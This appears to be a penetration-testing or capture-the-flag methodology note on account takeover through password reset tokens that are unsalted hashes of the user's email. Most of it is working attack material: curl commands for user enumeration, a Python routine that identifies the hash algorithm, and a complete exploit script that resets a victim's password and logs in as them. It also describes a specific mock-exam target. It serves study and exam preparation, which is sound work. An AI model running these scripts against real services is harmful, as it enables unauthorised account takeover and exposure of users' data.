# Predictable Password Reset Token (Hash of Email)

## Trigger
- Application has forgot password functionality
- Password reset uses a "hash" or "token" parameter
- The token is not cryptographically random

## Discovery Technique: Response Differential

### Step 1: Identify user enumeration via forgot password
Compare responses between existing and non-existing emails:
```bash
# Existing user
curl -sk -X POST https://target.com/forgot -d 'email=existing@domain.com'
# Response: "Check your inbox for the link to reset your password."

# Non-existing user  
curl -sk -X POST https://target.com/forgot -d 'email=fake@nowhere.xyz'
# Response: "Check your inbox for the link to reset  your password." (double space!)
```

Differentials to check:
- Response body text (even subtle differences like extra whitespace)
- Response timing (existing user takes longer due to email send)
- Content-Length differences
- HTTP status codes

### Step 2: Identify the reset token validation
```bash
# Try change password with empty/random hash
curl -sk -X POST https://target.com/change-password -d 'hash=&password=new&confirm=new'
# "Token expired!" = endpoint validates hash

curl -sk -X POST https://target.com/change-password -d 'hash=random123&password=new&confirm=new'
# "Token expired!" = hash is checked, not ignored
```

### Step 3: Test predictable hash patterns
Try these in order (register 2+ accounts, compare hashes to detect pattern):
1. `MD5(email)` — most common weak pattern (32 hex chars)
2. `SHA1(email)` — 40 hex chars
3. `SHA256(email)` — 64 hex chars
4. `SHA512(email)` — 128 hex chars (confirmed in SecOps June 2026)
5. `MD5(user_id)` or `SHA1(user_id)`
6. `MD5(email + timestamp)` — harder but testable with known accounts
7. `base64(email)`
8. Sequential/incremental tokens

**Quick identification by token length:**
- 32 hex = MD5 | 40 hex = SHA1 | 64 hex = SHA256 | 128 hex = SHA512

```python
import hashlib
target_email = "victim@domain.com"

# Test all common hash algorithms against a KNOWN token from your own account
known_email = "myaccount@mailinator.com"
known_token = "a10e81cd..."  # from your reset link

for algo in ['md5', 'sha1', 'sha256', 'sha512']:
    h = hashlib.new(algo, known_email.encode()).hexdigest()
    if h == known_token:
        print(f"MATCH: {algo}(email)")
        # Now compute victim's token
        victim_token = hashlib.new(algo, target_email.encode()).hexdigest()
        break
```

### Step 4: Full exploitation
```python
import requests, hashlib

TARGET = "victim@secops.group"
NEW_PASS = "Pwned123"
BASE = "https://target.com"

s = requests.Session()
s.verify = False

# Compute predictable token
token = hashlib.md5(TARGET.encode()).hexdigest()

# Reset password directly (no email access needed)
r = s.post(f"{BASE}/login", data={
    "hash": token,
    "change_password": NEW_PASS,
    "change_con_password": NEW_PASS
})
print(r.text)  # "Password update succefully.."

# Login as victim
r = s.post(f"{BASE}/login", data={"username": TARGET, "password": NEW_PASS})
print(r.text)  # "Success."

# Access victim profile
r = s.get(f"{BASE}/home")
print(r.text)  # Contains victim data / flag
```

## Real Example (SecOps Group Mock Exam, June 2026)
- All forms (login, signup, forgot, change password) POST to same `/login` endpoint
- Signup blocks `@secops.group` domain (client-side check: `chk_valid_domain`)
- Login returns same error for existing/non-existing users ("User not Found") — even for WRONG PASSWORD on valid users
- Forgot password differentiates: single space (exists) vs double space (not exists)
- Reset token = `SHA512(email)` — 128 hex chars, no expiry, no single-use enforcement
- Change password: POST `/login` with `hash=<sha512>&change_password=X&change_con_password=X`
- Must trigger forgot password FIRST to activate the hash before using it to reset
- Login session via curl requires `-c`/`-b` cookie jar but the authenticated page may not render (use browser for flag retrieval after password change)

## Pitfalls
- Login endpoint may return identical messages for valid/invalid users — test forgot password and signup for enumeration instead
- Signup may block certain email domains (client-side JS) — bypass by calling API directly, BUT the server may enforce it too
- The change password endpoint may share the same URL as login (all POST to `/login`) — differentiated by parameter names
- Always register YOUR OWN account first to understand the normal flow before attacking

## Severity
- Critical (CVSS 9.8) — allows full account takeover without any user interaction or email access
